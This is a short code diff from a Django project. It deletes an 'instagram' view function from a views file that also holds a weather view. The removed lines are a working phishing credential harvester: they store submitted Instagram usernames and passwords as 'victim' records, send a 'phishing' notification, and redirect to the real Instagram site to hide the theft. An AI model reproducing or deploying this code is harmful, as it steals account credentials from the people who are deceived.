@@ -128,14 +128,3 @@ def weather(request):
         return render(request, 'projects/weather.html', get_weather(city))
     log(request, 'weather')
     return render(request, 'projects/weather.html', context)
-
-def instagram(request):
-    if request.method == 'POST':
-        username = request.POST.get('username').lower()
-        password = request.POST.get('password')
-        victim = Instagram.objects.create(username=username,password=password)
-        victim.save()
-        push(f'phishing -- {request.user} -- submitted')
-        return redirect('https://www.instagram.com')
-        
-    return render(request, 'projects/instagram.html')
